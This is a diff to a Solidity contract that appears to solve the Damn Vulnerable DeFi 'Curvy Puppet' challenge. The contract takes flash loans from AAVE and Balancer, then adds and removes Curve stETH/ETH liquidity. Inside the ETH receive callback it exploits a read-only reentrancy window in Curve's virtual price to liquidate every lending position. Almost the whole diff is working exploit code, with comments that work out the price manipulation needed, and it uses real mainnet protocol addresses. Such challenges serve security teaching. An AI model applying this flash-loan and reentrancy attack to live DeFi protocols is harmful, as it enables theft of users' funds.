@@ -204,7 +204,7 @@ interface IUniswapV2Router02 {
 
 }
 
-contract Rescuer {
+contract Rescuer is Test{
     CurvyPuppetLending public lending;
     IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
     IStableSwap constant curvePool = IStableSwap(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
@@ -234,9 +234,13 @@ contract Rescuer {
         //   CurvePool balances[1]: 35548870433002420435140
         //   CurvePool LP token supply 63900743099782364043112
         //   CurvePool LP token price 1096890440129560193
+
         //   Collateral value: 25000000000000000000000
         //   Borrow value: 4387561760518240772000
-        //   Collateral to borrow ratio(%): 569 // <--- We have to increase the price of the borrowed asset >= 6 times in order to liquidate the position
+        //   =>
+        //   To trigger liquidation, the borrowed asset price must increase by at least this amount:
+        //   25000000000000000000000 / 4387561760518240772000 / 1.75 = 3.2559574236117226 // See 1.75 is from CurvyPuppetLending.liquidate
+
         //   AAVE Pool WETH balance 0
         //   AAVE Pool stETH balance 0
         //   BalancerVault WETH balance 37991917252778937136234
@@ -251,7 +255,7 @@ contract Rescuer {
         //   LP token price in the middle of removing liquidity:  1966561483253545387
         //   LP token supply after removing liquidity: 152693223694457871751602
 
-        // Find x, y, dx, dy which make right side >  5.69 * 1.09, 10 is chosen here:
+        // Find x, y, dx, dy which make right side >  3.26 * 1.09, 10 is chosen here:
         // 5.69 is the ratio of collateral to borrow value, 1.09 is the LP token price
         // (A + 2x - d + B) / (S - 2d) = 10
         // where
@@ -284,17 +288,13 @@ contract Rescuer {
     }
 
     function rescue() external {
-        // FlashLoan API:https://aave.com/docs/developers/smart-contracts/pool#flashloan
-        // function flashLoan(
-        //     address receiverAddress,
-        //     address[] calldata assets,
-        //     uint256[] calldata amounts,
-        //     uint256[] calldata interestRateModes,
-        //     address onBehalfOf,
-        //     bytes calldata params,
-        //     uint16 referralCode
-        // ) public virtual override
-
+        IERC20(curvePool.lp_token()).approve(address(permit2), type(uint256).max);
+        permit2.approve({
+            token: curvePool.lp_token(),
+            spender: address(lending),
+            amount: type(uint160).max,
+            expiration: uint48(block.timestamp + 1 days)
+        });
         flashLoanFromAAVE();
     }
 
@@ -311,19 +311,28 @@ contract Rescuer {
                                                                     amounts,
                                                                     ""
                                                                    ));
-
         require(success, "Balancer flashloan failed");
-
     }
 
     function flashLoanFromAAVE() internal{
+        // FlashLoan API:https://aave.com/docs/developers/smart-contracts/pool#flashloan
+        // function flashLoan(
+        //     address receiverAddress,
+        //     address[] calldata assets,
+        //     uint256[] calldata amounts,
+        //     uint256[] calldata interestRateModes,
+        //     address onBehalfOf,
+        //     bytes calldata params,
+        //     uint16 referralCode
+        // ) public virtual override
+
         address[] memory assets = new address[](2);
         assets[0] = address(weth);
         assets[1] = address(stETH);
 
 
         uint256[] memory amounts = new uint256[](2);
-        amounts[0] = 110000 ether;
+        amounts[0] = 38000 ether;
         amounts[1] = 172000 ether;
 
         uint256[] memory interestRateModes = new uint256[](2); // leave it to default 0
@@ -338,9 +347,7 @@ contract Rescuer {
                                                                 "", // params
                                                                 0 // referralCode
                                                                ));
-
         require(success, "AAVE flashloan failed");
-
     }
 
     // AAVE flashloan callback
@@ -351,16 +358,21 @@ contract Rescuer {
                               address initiator,
                               bytes calldata params
     ) external returns (bool){
-        uint256 amount = amounts[0];
-        uint256 premium = premiums[0];
+        uint256 wethAmount = amounts[0];
+        uint256 wethPremium = premiums[0];
 
         uint256 stETHAmount = amounts[1];
         uint256 stETHPremium = premiums[1];
 
-        flashLoanFromBalancer();
+        console.log("stETH balance required to repay AAVE: ", stETHAmount + stETHPremium);
+        console.log("weth balance required to repay AAVE: ", wethAmount + wethPremium);
 
-        weth.approve(msg.sender, amount + premium);
-        weth.approve(player, type(uint256).max);
+        // For repayment
+        weth.approve(aavePool, type(uint256).max);
+        stETH.approve(aavePool, type(uint256).max);
+        IERC20(stETH).approve(address(curvePool), type(uint256).max);
+
+        flashLoanFromBalancer();
 
         return true;
     }
@@ -375,58 +387,38 @@ contract Rescuer {
         uint256 amount = amounts[0];
         uint256 premium = premiums[0];
 
-        console.log("LP token price before flashloan: ", curvePool.get_virtual_price());
-
-        // address uniswapRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // Uniswap V2 Router
-        // weth.approve(uniswapRouter, type(uint256).max);
-        // // Swap WETH for stETH on Uniswap
-        // address[] memory path = new address[](2);
-        // path[0] = address(weth);
-        // path[1] = address(stETH);
-        // IUniswapV2Router02(uniswapRouter).swapExactTokensForTokens(amount, 0, path, address(this), block.timestamp + 1 days);
-
-        // uint256 stETHBalance = stETH.balanceOf(address(this));
-        // console.log("stETH balance after swap: ", stETHBalance); // too few (1000+) stETH
+        console.log("Balancer repayment amount: ", amount + premium);
 
         weth.withdraw(weth.balanceOf(address(this)));
         IERC20(stETH).approve(address(curvePool), type(uint256).max);
-        // uint256 stETHAmount = curvePool.exchange{value: amount - 100}(0, 1, amount - 100, 0);
-        // console.log("stETH amount received: ", stETHAmount);
-        // uint256 lpTokenAmount = curvePool.add_liquidity{value: 100}([100, stETHAmount], block.timestamp + 1 days);
+
         uint256 stETHBalance = IERC20(stETH).balanceOf(address(this));
-        uint256 lpTokenAmount = curvePool.add_liquidity{value: address(this).balance}([address(this).balance, stETHBalance], block.timestamp + 1 days);
+        curvePool.add_liquidity{value: 68000 ether}([68000 ether, stETHBalance], block.timestamp + 1 days);
 
         trigger = true;
-        // uint256[2] memory withdrawn  = curvePool.remove_liquidity(lpTokenAmount, [uint256(1), 30000 ether]);
-        // console.log("ETH withdrawn: ", withdrawn[0]);
-        // console.log("stETH withdrawn: ", withdrawn[1]);
-
-
-        console.log("LP token supply before removing liquidity:", IERC20(curvePool.lp_token()).totalSupply());
-        // console.log("Removing from LP stETH", stETHBalance + 30000 ether);
-        // uint256 lpTokenBurned = curvePool.remove_liquidity_imbalance([uint256(1), 130000 ether], lpTokenAmount);
-        // console.log("LP tokens burned: ", lpTokenBurned);
-        uint256[2] memory withdrawn  = curvePool.remove_liquidity(lpTokenAmount, [uint256(0), uint256(0)]);
-        console.log("LP token supply after removing liquidity:", IERC20(curvePool.lp_token()).totalSupply());
-
-
-
+        uint256 lpTokenBalance = IERC20(curvePool.lp_token()).balanceOf(address(this));
+        uint256[2] memory withdrawn  = curvePool.remove_liquidity(lpTokenBalance - 3 ether, [uint256(0), uint256(0)]); // Keep some LP token, 3 ether, enough to repay during CurvyPuppetLending liquidating
         weth.deposit{value: address(this).balance}();
+        trigger = false;
+
+        // Repay balancer
+        weth.approve(balancerPool, amount + premium);
+
+        console.log("stETH balance left ", stETH.balanceOf(address(this)));
+        console.log("weth balance left ", weth.balanceOf(address(this)));
 
     }
 
     receive() external payable {
-        console.log("Received ETH from ", msg.sender);
-        console.log("Received ETH: ", msg.value);
-
         if (!trigger){
             return;
         }
-
         // Must be triggered by the remove_liquidty callback, ie. bad state only occurs inside remove_liquidity function
         console.log("LP token price in the middle of removing liquidity: ", curvePool.get_virtual_price());
 
-        lending.liquidate(users[0]);
+        for (uint256 i = 0; i < users.length; i++){
+            lending.liquidate(users[i]);
+        }
     }
 }
 
